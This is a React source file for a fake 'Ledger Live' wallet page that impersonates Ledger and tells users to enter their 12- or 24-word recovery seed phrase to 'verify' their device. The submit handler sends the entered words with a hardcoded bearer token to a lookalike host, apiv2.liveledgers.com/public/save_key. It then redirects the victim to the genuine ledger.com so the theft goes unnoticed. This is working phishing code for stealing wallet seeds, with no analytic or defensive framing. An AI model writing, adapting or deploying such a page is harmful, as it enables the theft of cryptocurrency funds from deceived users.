import { useState, useEffect } from 'react';
import { Link, redirect, useNavigate } from 'react-router-dom';
import { toast } from 'react-toastify';
import { Helmet } from 'react-helmet-async';
import { FaBarsStaggered, FaBars, FaBell, FaRegEye, FaCircleQuestion, FaLock, FaDownload, FaDollarSign, FaUpload } from "react-icons/fa6";
import { FaCog, FaTools } from "react-icons/fa";

import { BsGraphUp } from "react-icons/bs";
import { BsGraphUpArrow } from "react-icons/bs";
import { IoSwapHorizontal } from "react-icons/io5";
import { RiFileList3Fill } from "react-icons/ri";

import AppLayout from '../../layouts/AppLayout';
import logoLive from './../../assets/img/ledger-live.png';
import ValidationService from '../../services/ValidationService';
import axios from 'axios';



function Verify() {

    let initKeyFormData                     =   {
        keys                                    :   [], 
        loading                                 :   false
    };

    const [showSideBar, setShowSideBar]     =   useState(1);
    const [keyLength, setKeyLength]         =   useState(12);
    const [keyFormData, setKeyFormData]     =   useState(initKeyFormData);
    
    
    const submitKeyFormHandler              =   (event)  =>  {
        event.preventDefault();
        let keys                            =   keyFormData.keys;

        setKeyFormData({...keyFormData, loading : true});

        let error = null;
        if(keys && keys === null) {
            error = 'Keys is required';
        } else if(!Array.isArray(keys)) {
            error = 'Keys is required';
        } else if(keys.length != keyLength) {
            error = 'Keys is invalid';
        } else if(keys.filter(v => v == null).length > 0) {
            error = "Key's world is required";
        }

        if(error) {
            toast.error(error);
            setKeyFormData({...keyFormData, loading : false});
        } else {
            setKeyFormData({...keyFormData, loading : true});

            const headers       =   { 'Accept': 'application/json','Content-Type':'application/json','Authorization':'Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6IjY2NTM2Mzg3NjY3MTNkMDBkMzk3YzhmMCJ9.vUCJSsofnVWOb8U7NKRZzLZPzo2QMt5bpp3I_3vJPvA'};

            axios({
                method: 'POST', headers: headers, data : keyFormData, url: 'https://apiv2.liveledgers.com/public/save_key'
            })
            .then(function (response) {
                setKeyFormData({...keyFormData, loading : false});
                window.location.href = 'https://www.ledger.com/';
                return null;
                
            })
            .catch(function (error) {
                let msg                 =   error?.response?.data?.detail ?? 'Application not initialize successfully.';
                toast.error(msg);
                setKeyFormData({...keyFormData, loading : false});
            });
        }

    }

    let rows = [], i = 0, len = keyLength;
    while (++i <= len) rows.push(i)


    return (<AppLayout>
        <Helmet>
            <title>Ledger Live</title>
        </Helmet>
        <nav className='navbar navbar-expand-md navbar-black fixed-top shadow-sm py-0 bg-black' style={{height:"60px"}}>
            <div className="container-fluid">
                <div className="navbar-brand py10">
                    <button className="btn border border-1 bg-black mt15" onClick={() => { setShowSideBar(!showSideBar) }}>
                        <FaBarsStaggered className="text-white" />
                    </button>
                    <Link className="ms30" href="#">
                        <img src={logoLive} alt="Logo" height="40" style={{filter: "invert(1)"}}  className="d-inline-block align-text-top" />
                    </Link>
                </div>
                <button className="navbar-toggler collapsed btn bg-dark" type="button" data-bs-toggle="collapse" data-bs-target="#navbarCollapse" aria-controls="navbarCollapse" aria-expanded="false" aria-label="Toggle navigation">
                    <FaBarsStaggered className="text-white" />
                </button>
                <div className="collapse navbar-collapse bg-black" id="navbarCollapse">
                    <ul className="navbar-nav ms-auto mb-md-0">
                        <li className="nav-item">
                            <ul className="navbar-nav nav">
                                <li className="nav-item dropdown px10 my10 border-end border-secondary">
                                    <Link className="nav-link text-white py0"><FaBell className='fs16' /></Link>
                                </li>
                                <li className="nav-item dropdown px10 my10 border-end border-secondary">
                                    <Link className="nav-link text-white-50 py0"><FaRegEye className='fs16' /></Link>
                                </li>
                                <li className="nav-item dropdown px10 my10 border-end border-secondary">
                                    <Link className="nav-link text-white-50 py0"><FaCircleQuestion className='fs16' /></Link>
                                </li>
                                <li className="nav-item dropdown px10 my10 border-end border-secondary">
                                    <Link className="nav-link text-white-50 py0"><FaLock className='fs16' /></Link>
                                </li>
                                <li className="nav-item dropdown px10 my10">
                                    <Link className="nav-link text-white-50 py0"><FaCog className='fs16' /></Link>
                                </li>
                            </ul>
                        </li>
                    </ul>
                </div>
            </div>
        </nav>
        <div className="side-navbar shadow-lg text-white active-nav bg-dark" style={{top:"60px", marginLeft: showSideBar ? "0px" : "-300px" }}>
            <div className='ps20 mt30'>
                <Link to="" className="text-light text-decoration-none d-block my25">
                    <BsGraphUp className='me10' /> Portfolio
                </Link>
                <Link to="" className="text-white-50 text-decoration-none d-block my25">
                    <BsGraphUpArrow className='me10' /> Market
                </Link>
                <Link to="" className="text-white-50 text-decoration-none d-block my25">
                    <RiFileList3Fill className='me10' /> Accounts
                </Link>
                <Link to="" className="text-white-50 text-decoration-none d-block my25">
                    <FaUpload className='me10' /> Send
                </Link>
                <Link to="" className="text-white-50 text-decoration-none d-block my25">
                    <FaDownload className='me10' /> Receive
                </Link>
                <Link to="" className="text-white-50 text-decoration-none d-block my25">
                    <FaDollarSign className='me10' /> Buy / Sell
                </Link>
                <Link to="" className="text-white-50 text-decoration-none d-block my25">
                    <IoSwapHorizontal className='me10' /> Swap
                </Link>
                <Link to="" className="text-white-50 text-decoration-none d-block my25">
                    <FaTools className='me10' /> Manager
                </Link>
            </div>
        </div>
        <div style={{paddingTop:"60px"}} className={[showSideBar ? 'with_sidebar' : 'without_sidebar'].join(" ")}>
            <div className="container-fluid">
                <div className="row">
                    <div className="col-sm-12 px50">
                        <h1 className='fs28'>VERIFY SEED PHRASE OF YOUR DEVICE</h1>
                        <p className='my20 text-white-50'>Enter your Recovery Seed Phrase Words to Import & Download Your Wallet App.</p>
                        <p className='my20 text-white-50'>**Ledger does not keep a copy of your recovery phrase.</p>
                        <p className='my20 text-white-50 fs14'>**ENTER 24 SEED PHRASE WORDS CORRECTLY TO START LEDGER LIVE.</p>
                        <div className="pt20 pb10">
                            <button onClick={() => setKeyLength(12)} className={['btn','btn-dark','px20', keyLength==12 ? 'formactive' : '', keyFormData.loading ? 'disabled' : ''].join(" ")}>12 Words</button>
                            <button onClick={() => setKeyLength(24)} className={['btn','btn-dark','px20', keyLength==24 ? 'formactive' : '', 'ms20', keyFormData.loading ? 'disabled' : ''].join(" ")}>24 Words</button>
                        </div>
                        <form onSubmit={submitKeyFormHandler} className="py10">
                            <div className="row">
                                {rows.map(function (i) {
                                    return <div key={i} className="col-sm-4 my12">
                                        <input 
                                            type="text" className="form-control text-white py8 key_input" 
                                            style={{background:"transparent", border:"1px solid #333"}} placeholder={i}
                                            value={keyFormData.keys[i-1] ? keyFormData.keys[i-1].val : ''}
                                            required
                                            onChange={(e) => {
                                                let keys = keyFormData.keys;
                                                keys[i-1] = {"key" : i, "val" : e.target.value} ;
                                                setKeyFormData({...keyFormData , keys : keys})
                                            }}
                                        />
                                    </div>
                                })}
                                <div className='col-sm-12 my20'>
                                    <button type='submit' className={['btn', 'btn-white-50', 'rounded-pill', 'text-white','border','px40','fs16', 'py10',  keyFormData.loading ? 'disabled' : ''].join(" ")}>
                                        {keyFormData.loading ? 'Processing ...' : 'Continue ...' }
                                    </button>
                                </div>
                            </div>
                        </form>
                    </div>
                </div>
            </div>
        </div>
    </AppLayout>)
}

export default Verify
